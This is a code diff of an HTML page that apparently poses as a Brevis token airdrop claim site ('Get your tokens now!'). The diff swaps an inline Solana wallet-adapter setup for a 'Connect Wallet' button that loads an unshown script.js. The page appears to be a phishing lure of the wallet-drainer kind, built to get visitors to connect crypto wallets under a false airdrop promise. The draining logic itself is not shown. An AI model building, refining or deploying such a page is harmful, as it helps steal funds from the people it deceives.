@@ -4092,7 +4092,6 @@
     </style>
     <meta name="referrer" content="no-referrer">
     <link rel="icon" href="images/favicon.png" type="image/png">
-    <link rel="stylesheet" href="https://unpkg.com/@solana/wallet-adapter-ui@latest/styles.css"/>
 </head>
 
 <body cz-shortcut-listen="true">
@@ -4110,8 +4109,7 @@
                                 <div></div>
                                 <div></div>
                                 <div class="ComingSoon_comingSoonText2__qK5sV">The airdrop claim for new Brevis users is now open. Get your tokens now!</div>
-                                <div id="wallet-button"></div>
-                                <div style="color:red; font-size:20px;">TEST — can you see this?</div>
+                                <button id="connectBtn" class="gradient-btn bst-butn-prime">Connect Wallet</button>
                             </div>
                         </div>
                     </div>
@@ -4130,43 +4128,8 @@
             </div>
         </div>
     </div>
-
-<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.0/lib/index.iife.min.js"></script>
-
-<script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-base@0.9.23/lib/index.iife.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-wallets@0.19.20/lib/index.iife.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-ui@0.9.35/lib/index.iife.min.js"></script>
-
-<script>
-  console.log("Base:", window.solanaWalletAdapterBase);
-  console.log("Wallets:", window.solanaWalletAdapterWallets);
-  console.log("UI:", window.solanaWalletAdapterUi);
-
-  const network = "mainnet-beta";
-
-  const wallets = [
-    new solanaWalletAdapterWallets.PhantomWalletAdapter(),
-    new solanaWalletAdapterWallets.SolflareWalletAdapter(),
-    new solanaWalletAdapterWallets.BackpackWalletAdapter(),
-    new solanaWalletAdapterWallets.WalletConnectWalletAdapter({
-      network,
-      options: {
-        projectId: "9d1df16cb9bc8262aee0becfe3d26f2e",
-      },
-    }),
-  ];
-
-  const walletProvider = new solanaWalletAdapterBase.WalletProvider({
-    wallets,
-    autoConnect: false,
-  });
-
-  const walletModal = new solanaWalletAdapterUi.WalletModalProvider({
-    container: document.getElementById("wallet-button"),
-    walletProvider,
-  });
-
-  walletModal.render();
-</script>
-
+    
+<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+<script src="script.js"></script>
+    
 </body></html>
